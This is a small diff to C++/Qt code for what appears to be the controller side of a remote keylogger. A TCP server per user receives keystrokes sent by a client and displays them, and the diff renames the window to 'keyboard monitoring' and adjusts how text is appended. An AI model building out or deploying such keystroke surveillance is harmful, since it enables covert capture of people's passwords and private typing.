@@ -17,7 +17,7 @@ Keybd::Keybd(QWidget *parent) : QWidget(parent)
 // 开始监控服务器，然后返回新的端口号
 int Keybd::startKeybdServer(QString userName){
     // 设置窗口标题
-    this->setWindowTitle(userName.append("-键盘监听"));
+    this->setWindowTitle(userName.append("-键盘监控"));
 
     // 开启新的服务端
     mServer = new TcpServer(this);
@@ -50,11 +50,9 @@ void Keybd::newConnection(QTcpSocket *s)
 void Keybd::processBuffer()
 {
     // 将数据打印到文本框
+    QString text = mEdit->toPlainText();
     // 针对GBK的解码
-    // 运用了append 会自带一个换行符
-    // 由于客户端固定时间发送一次
-    // 因此 连敲的按键不会多换一行 会连着显示
-    mEdit->append(codec->toUnicode(*mSock->buffer()));
+    mEdit->setText(text.append(codec->toUnicode(*mSock->buffer())));
 
     // 清空缓冲区
     mSock->buffer()->clear();
